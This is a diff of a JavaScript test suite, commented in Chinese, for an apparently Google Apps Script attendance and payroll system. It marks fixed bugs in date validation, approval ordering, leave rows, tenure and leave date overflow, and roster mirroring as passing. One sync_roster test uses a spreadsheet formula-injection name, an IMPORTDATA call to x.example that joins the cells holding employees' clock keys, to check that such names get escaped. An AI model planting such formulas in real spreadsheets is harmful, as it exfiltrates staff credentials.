@@ -217,31 +217,32 @@ console.log('━━ 第一節：值班核定（mgr_approve 一條龍）━━');
 /* 1. 日期只驗 \d{4}-\d{2}-\d{2}，不驗真：V8 把 '2026-11-31' 當 12/1、'2026-02-30' 當 3/2。
    核定與請假列都用那個不存在的字串寫進表 → payCollect 用 slice(0,7) 歸到 11 月：事假 8 小時照扣錢、缺勤天數 +1 扣全勤。
    manager.html 的日期選擇器選不出這種日期，但營運系統／任何拿到主管金鑰的呼叫端可以直接送。 */
-KNOWN('核定日期要驗真：2026-11-31／2026-02-30 應回 bad_date（Requests.gs 的 reqIsDate_ 早就擋了，這裡沒擋）', () => {
+ok('核定日期要驗真：2026-11-31／2026-02-30 應回 bad_date（Requests.gs 的 reqIsDate_ 早就擋了，這裡沒擋）', () => {
   const m = make({ self: { roster: [ME] } });
   const r = approve(m.sb, { date: '2026-11-31', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 8 }] });
   assert.strictEqual(r.ok, false, '收下了：' + JSON.stringify(r));
   assert.strictEqual(r.error, 'bad_date');
 });
-ok('（後果）2026-11-31 的核定＋事假 8 小時：payCollect 把它算進 11 月（事假 8H、缺勤 1 天、核定 9H）', () => {
+ok('（修好後）2026-11-31 的核定＋事假 8 小時：直接 bad_date，核定與請假分頁都沒寫、11 月薪資不受影響', () => {
   const m = make({ self: { roster: [ME] } });
   const r = approve(m.sb, { date: '2026-11-31', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 8 }] });
-  assert.strictEqual(r.ok, true);
+  assert.strictEqual(r.error, 'bad_date', JSON.stringify(r));
+  assert.ok(!m.rows('approved').some((x) => String(x[0]) === '2026-11-31'));
   const c = J(m.sb.payCollect('2026-11', 6, 'SSLGF', [], null));
-  assert.strictEqual(c.E01.personal_h, 8); assert.strictEqual(c.E01.deduct_days, 1); assert.strictEqual(c.E01.hours, 9);
+  assert.ok(!c.E01 || !(c.E01.personal_h > 0), JSON.stringify(c.E01));
 });
 ok('（對照）閏日 2028-02-29 核定正常收、2026-13-01 擋（NaN 不會寫進表）', () => {
   const m = make({ self: { roster: [ME], events: [[T('2028-02-29T09:00:00'), 'E01', 'in'], [T('2028-02-29T18:00:00'), 'E01', 'out']] } });
   const r = approve(m.sb, { date: '2028-02-29', periods: [PERIOD('09:00', '18:00')] });
   assert.strictEqual(r.ok, true); assert.strictEqual(r.status_text, '正常'); assert.strictEqual(r.approved_hours, 9);
   const out = JSON.parse(m.sb.doPost({ postData: { contents: JSON.stringify({ action: 'mgr_approve', mgr_key: 'MK', emp_id: 'E01', date: '2026-13-01', periods: [PERIOD('09:00', '18:00')] }) } }).__text);
-  assert.strictEqual(out.ok, false);   // 現況：addDaysStr 對 NaN 丟 RangeError → server_error（應該是 bad_date，見上一條 KNOWN）
+  assert.strictEqual(out.error, 'bad_date', JSON.stringify(out));   // 2026-11-04 修好：原本 addDaysStr 對 NaN 丟 RangeError → server_error
   assert.ok(!m.rows('approved').some((x) => String(x[0]) === '2026-13-01'), '寫進去了');
 });
 
 /* 2. 「同 (date,emp_id) 取 entered_at 最新」用嚴格大於：同一秒內的第二筆核定輸給第一筆。
    主管手機連按兩次「送出核定」或營運系統連送兩筆更正，兩筆在同一秒落地 → 後送的（更正）被忽略，薪資照第一筆算。 */
-KNOWN('同一秒內兩筆核定：後寫的那筆要算數（buildLatestApprovedMap 平手時應取較晚的列）', () => {
+ok('同一秒內兩筆核定：後寫的那筆要算數（buildLatestApprovedMap 平手時應取較晚的列）', () => {
   const m = make({ now: T('2026-11-02T20:00:00'), self: { roster: [ME], events: [[T('2026-11-02T09:00:00'), 'E01', 'in'], [T('2026-11-02T12:00:00'), 'E01', 'out']] } });
   assert.ok(approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')] }).ok);          // 手滑填 18:00
   assert.ok(approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '12:00')] }).ok);          // 同一秒內更正成 12:00
@@ -259,7 +260,7 @@ ok('（對照）隔 1 秒的更正照常生效', () => {
 
 /* 3. 時段 start === end：後端「end<=start 視為跨夜 +1 天」把 09:00–09:00 算成 24 小時。
    manager.html 會在確認框講「會算成跨夜到隔天（24 小時）」，營運系統直接呼叫就沒有這層。 */
-KNOWN('時段起訖相同（09:00–09:00）應擋 bad_periods，而不是核定 24 小時', () => {
+ok('時段起訖相同（09:00–09:00）應擋 bad_periods，而不是核定 24 小時', () => {
   const m = make({ self: { roster: [ME] } });
   const r = approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '09:00')] });
   assert.strictEqual(r.ok, false, '核定了 ' + r.approved_hours + ' 小時');
@@ -274,7 +275,7 @@ ok('（對照）真跨夜 22:00–02:00 算 4 小時；10-31 跨到 11-01 的卡
 
 /* 4. 名冊姓名帶尾端空白（手動編輯、sync_roster 原樣寫入）：leaveRowsOf 用「trim 後的表 vs 未 trim 的名冊名」比對，永遠對不到
    → 核定頁看不到他的假、每次重送核定都多一列假 → payCollect 用 trim 對人，請假時數每核一次就翻倍。 */
-KNOWN('名冊姓名尾端有空白：重送核定要「取代」原本的請假列，不能越積越多', () => {
+ok('名冊姓名尾端有空白：重送核定要「取代」原本的請假列，不能越積越多', () => {
   const m = make({ self: { roster: [Object.assign({}, ME, { name: '測試一 ' })] } });
   approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 4 }] });
   approve(m.sb, { date: '2026-11-02', periods: [PERIOD('09:00', '18:00')], leaves: [{ type: '事假', hours: 4 }] });
@@ -395,7 +396,7 @@ ok('新增同仁：>20 字擋、與主管同名擋、與在職同名擋（離職
 });
 /* 8. 管理金鑰的 sync_roster（舊的整批同步）把 name 原樣寫進名冊：= 開頭會被 Sheets 當公式跑，而名冊那張表就放著所有人的打卡鑰匙。
    新路徑 svc_add（管理系統 2026-10-14 起用）已擋 svcFormulaLike_；主管頁 mgr_add_employee 也換全形；只剩這支沒擋。 */
-KNOWN('sync_roster 寫名冊：姓名 = + - @ 開頭要換全形（同 sheetSafeText_），不能原樣寫進放鑰匙的那張表', () => {
+ok('sync_roster 寫名冊：姓名 = + - @ 開頭要換全形（同 sheetSafeText_），不能原樣寫進放鑰匙的那張表', () => {
   const m = make({ self: { roster: [ME] } });
   const r = m.sb.handleSyncRoster({ admin_key: 'ADM', employees: [{ emp_id: 'E07', name: '=IMPORTDATA("https://x.example/?"&JOIN(",",C2:C9))', active: true }, { emp_id: 'E01', name: '+測試一', active: true }] });
   assert.ok(r.ok);
@@ -611,7 +612,7 @@ const PT = (hire) => ({ emp_id: 'P1', name: '計時一', is_full_time: 'false', 
 /* 5. 計時年資加給：「滿 N 個月之後的次月」用 new Date(y, m+6, d) 算到期日，月底到職會溢位到下個月：
    8/31 到職 → 滿半年算成 3/2（應為 2/28）→ 3 月 1 號不「晚於」3/2 → 3 月拿不到、4 月才有；10/31 → 4/31＝5/1 → 5 月拿不到。
    少的那個月：100 小時 × 10 元＝1,000 元。 */
-KNOWN('計時年資加給：8/31 到職應從隔年 3 月起加 10 元（10/31 → 5 月、3/31 → 10 月），月底到職不能晚一個月', () => {
+ok('計時年資加給：8/31 到職應從隔年 3 月起加 10 元（10/31 → 5 月、3/31 → 10 月），月底到職不能晚一個月', () => {
   const m = make();
   const plus = (hire, ym) => m.sb.payTenurePlus(PT(hire), ym, CFG);
   assert.strictEqual(plus('2026-08-28', '2027-03'), 10);
@@ -630,7 +631,7 @@ ok('（對照）計時年資加給正常例：6/5 到職 → 隔年 1 月起；1
   assert.deepStrictEqual(r.earn.map((x) => x.item_key), ['hourly_wage', 'pt_tenure_plus']);
 });
 /* 6. 特休週年期同樣用 setMonth 溢位：8/31 到職的「滿 6 個月」起點算成 3/3（應 2/28），3/1、3/2 請的特休不算已用 → 剩餘特休多算 → 折算工資多發。 */
-KNOWN('特休週年期：8/31 到職的半年期應從 2/28（或 3/1）起算，3/1 請的特休要算進已用', () => {
+ok('特休週年期：8/31 到職的半年期應從 2/28（或 3/1）起算，3/1 請的特休要算進已用', () => {
   const FT = { emp_id: 'F1', name: '正職一', is_full_time: 'true', base: 30000, hire_date: '2026-08-31', active: 'true', store: 'SSLGF' };
   const m = make({ pay: { master: [FT], store: [{ code: 'SSLGF', name: '甲', active: 'true', clock_ss_id: '' }] },
     self: { roster: [{ emp_id: 'F1', name: '正職一', key: 'KF', active: 'TRUE' }], leave: [['2027-03-01', '正職一', '特休假', 8]] } });
@@ -815,7 +816,7 @@ ok('鏡像：乾跑零寫入；套用只抄 HQ- 前綴的人（events／approved
   assert.strictEqual(c[''] && c[''].hours, 4);
 });
 /* 7. emp_prefix 沒去前後空白：' HQ-' 永遠對不到任何人 → 來源挑出 0 列、卻照樣把上次鏡像的列全刪 → 總部薪資那些人的工時／核定／請假整批消失（乾跑只會顯示 removed N added 0）。 */
-KNOWN('鏡像設定 emp_prefix 帶空白（" HQ-"）：要去空白或拒絕執行，不能把上次鏡像的列整批清掉', () => {
+ok('鏡像設定 emp_prefix 帶空白（" HQ-"）：要去空白或拒絕執行，不能把上次鏡像的列整批清掉', () => {
   const m = mirrorCtx('HQ-');
   assert.ok(m.sb.handleMirrorRun({ admin_key: 'ADM', apply: true }).ok);
   m.C('MIRROR_SOURCES[0].emp_prefix = " HQ-";');
